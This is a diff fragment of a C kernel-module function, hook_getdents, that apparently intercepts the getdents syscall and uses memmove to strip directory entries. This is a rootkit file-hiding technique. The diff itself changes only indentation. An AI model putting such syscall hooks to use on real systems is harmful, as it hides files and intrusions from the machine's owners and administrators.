@@ -135,16 +135,16 @@ asmlinkage int hook_getdents(const struct pt_regs* regs)
         }
 
 shift_and_iter:
-	    if (shift_by > 0) {
-	        memmove(d, (char *)d + shift_by, bytes_left - shift_by);
-	        ret -= shift_by > 0 ? shift_by : 0; // no need to shift at all if 0
+    	if (shift_by > 0) {
+	    memmove(d, (char *)d + shift_by, bytes_left - shift_by);
+	    ret -= shift_by > 0 ? shift_by : 0; // no need to shift at all if 0
             bytes_left -= shift_by; // shift != reclen here (reclen infers to the next one
         } else {
             offset += d->d_reclen; // offset should not be updated when shifting
             bytes_left -= d->d_reclen;
             pr_info("hello from %s\n", d->d_name);
         }
-	    continue;
+	continue;
     }
 
     if (copy_to_user(dirp, kdirent, ret)) {
